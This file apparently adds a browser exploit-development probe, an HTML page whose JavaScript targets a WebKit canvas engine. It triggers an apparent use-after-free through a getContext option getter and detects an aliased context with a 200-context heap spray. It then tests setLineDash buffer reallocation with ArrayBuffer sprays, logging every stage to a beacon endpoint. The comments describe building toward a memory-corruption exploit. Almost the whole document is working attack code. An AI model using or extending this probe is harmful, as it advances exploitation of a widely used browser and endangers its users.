@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P708 — setLineDash odd/even rule + capacity retention</title>
+<script>
+'use strict';
+/* ============================================================
+ * P708 — confirm the odd/even duplication rule and test whether
+ * a REPLACE (state.lineDash = dash) can free a buffer that is
+ * still referenced (the last open question on this route).
+ *
+ * Source (WK-7617 CanvasRenderingContext2DBase.cpp:1041):
+ *
+ *   void setLineDash(const Vector<double>& dash) {
+ *       if (!lineDashSequenceIsValid(dash)) return;
+ *       realizeSaves();
+ *       auto& state = modifiableState();
+ *       state.lineDash = dash;              // REPLACE (copy-assign)
+ *       if (dash.size() % 2)                // ODD => duplicate
+ *           state.lineDash.appendVector(dash);
+ *       applyLineDash();
+ *   }
+ *
+ * P707'S "APPENDS" VERDICT WAS WRONG. What looked like accumulation
+ * was the spec's odd-length duplication. P707's S3 rows were all
+ * EVEN (2,4,8,...) so they showed n->n, and 1 (odd) showed 1->2.
+ * This probe states the rule and tests it exhaustively.
+ *
+ * Then, the real question for UAF: `state.lineDash = dash` on a
+ * Vector with EXISTING CAPACITY may reuse the buffer, and a GROWING
+ * assign frees the old one. Does any sequence leave the live State
+ * reading through a freed buffer? Test by:
+ *   - big -> small  (capacity retained, no realloc expected)
+ *   - small -> big  (realloc, old buffer freed)
+ *   - odd lengths   (replace + appendVector = two allocations)
+ * and after each, immediately spray ArrayBuffers sized to the
+ * POSSIBLE old capacity, then read back and check for corruption.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P708-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,340))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function len(a){ return a ? a.length : -1 }
+function j(a,n){ if(!a) return '-'; return a.slice(0,Math.min(n,a.length)).join(','); }
+
+var INNER=null, SPRAY=[], ALIAS=null;
+
+function run(){ raw('BOOT','p708'); try{ s0(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); } }
+
+function s0(){
+  raw('S0-GO','');
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ INNER=cv.getContext('2d'); return true; }});
+  cv.getContext('bitmaprenderer', o);
+  if(!INNER){ raw('S0-FAIL','no-inner'); return; }
+  for(var i=0;i<200;i++){
+    var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){ sx.lineWidth=1337.0; SPRAY.push(sx); }
+  }
+  try{ INNER.lineWidth=2468.0; }catch(e){ return; }
+  for(var k=0;k<SPRAY.length;k++){
+    try{ if(SPRAY[k].lineWidth===2468.0){ ALIAS=SPRAY[k]; break; } }catch(e){}
+  }
+  raw('S0-UAF','inner=OK|alias='+(ALIAS?'yes':'no'));
+  if(!ALIAS) return;
+  setTimeout(s1, 20);
+}
+
+/* ---- S1: the odd/even rule, exhaustive 1..10 ---- */
+function s1(){
+  raw('S1-GO','');
+  try{
+    var out=[];
+    for(var n=1;n<=10;n++){
+      /* set a known n-element array (fresh context state each time via
+       * setLineDash of a DIFFERENT even length first does not matter:
+       * the assign replaces, so length should be n or 2n by parity) */
+      var arr=[];
+      for(var i=0;i<n;i++) arr.push(n*10+i);
+      INNER.setLineDash(arr);
+      var g=INNER.getLineDash();
+      var expect = (n%2) ? (2*n) : n;
+      out.push(n+'->'+len(g)+(len(g)===expect?'':'!'));
+    }
+    raw('S1-PARITY',out.join(' '));
+  }catch(e){ raw('S1-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s2, 20);
+}
+
+/* ---- S2: big -> small (does capacity retention expose stale data?) ---- */
+function s2(){
+  raw('S2-GO','');
+  try{
+    var big=[];
+    for(var i=0;i<1024;i++) big.push(900000+i);
+    INNER.setLineDash(big);
+    raw('S2-BIG','len='+len(INNER.getLineDash())+'|v0='+INNER.getLineDash()[0]);
+
+    INNER.setLineDash([1.25, 2.25]);            /* small, even */
+    var sm=INNER.getLineDash();
+    raw('S2-SMALL','len='+len(sm)+'|v='+j(sm,8));
+
+    /* spray ABs matching the OLD big capacity (1024*8 = 8192) in case
+     * the replace freed it and left the State pointing at it */
+    var ab=[];
+    for(var s=0;s<64;s++) ab.push(new ArrayBuffer(8192));
+    raw('S2-SPRAY','n=64|sz=8192');
+
+    var after=INNER.getLineDash();
+    raw('S2-AFTER','len='+len(after)+'|v='+j(after,8));
+
+    var nz=0;
+    for(var k=0;k<ab.length;k++){
+      var u=new Uint8Array(ab[k]);
+      for(var q=0;q<u.length;q++){ if(u[q]!==0){ nz++; break; } }
+    }
+    raw('S2-ABNZ','with_data='+nz+'/'+ab.length);
+  }catch(e){ raw('S2-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s3, 20);
+}
+
+/* ---- S3: small -> big (realloc frees the small buffer) ---- */
+function s3(){
+  raw('S3-GO','');
+  try{
+    INNER.setLineDash([5.5, 6.5]);              /* small, cap ~2 */
+    var before=INNER.getLineDash();
+    raw('S3-SMALL','len='+len(before)+'|v='+j(before,4));
+
+    var big=[];
+    for(var i=0;i<2000;i++) big.push(800000+i);
+    INNER.setLineDash(big);
+    var after=INNER.getLineDash();
+    raw('S3-BIG','len='+len(after)+'|v0='+after[0]+'|vN='+after[after.length-1]);
+
+    /* the freed buffer would be the SMALL one (16 bytes) */
+    var ab=[];
+    for(var s=0;s<600;s++) ab.push(new ArrayBuffer(16));
+    for(var s2=0;s2<600;s2++) ab.push(new ArrayBuffer(32));
+    raw('S3-SPRAY','small-sizes 600x16 600x32');
+
+    var chk=INNER.getLineDash();
+    raw('S3-AFTER','len='+len(chk)+'|v0='+chk[0]+'|vN='+chk[chk.length-1]);
+  }catch(e){ raw('S3-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s4, 20);
+}
+
+/* ---- S4: odd-length path (replace + appendVector, two allocs) ---- */
+function s4(){
+  raw('S4-GO','');
+  try{
+    var seq=[];
+    /* warn up capacity with a large even set, then hammer ODD sets of
+     * growing size so replace+append both run and realloc */
+    var warm=[];
+    for(var i=0;i<64;i++) warm.push(700000+i);
+    INNER.setLineDash(warm);
+    raw('S4-WARM','len='+len(INNER.getLineDash()));
+
+    var sizes=[3,7,15,31,63,127,255,511,1023];
+    for(var si=0;si<sizes.length;si++){
+      var n=sizes[si], arr=[];
+      for(var k=0;k<n;k++) arr.push(600000+si*1000+k);
+      INNER.setLineDash(arr);
+      var g=INNER.getLineDash();
+      seq.push(n+'->'+len(g)+':'+j(g,3));
+    }
+    raw('S4-ODD',seq.join(' | '));
+  }catch(e){ raw('S4-ERR',(e.message||'').slice(0,120)); }
+
+  raw('DONE','p708-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P708 — odd/even rule + capacity</pre></body></html>
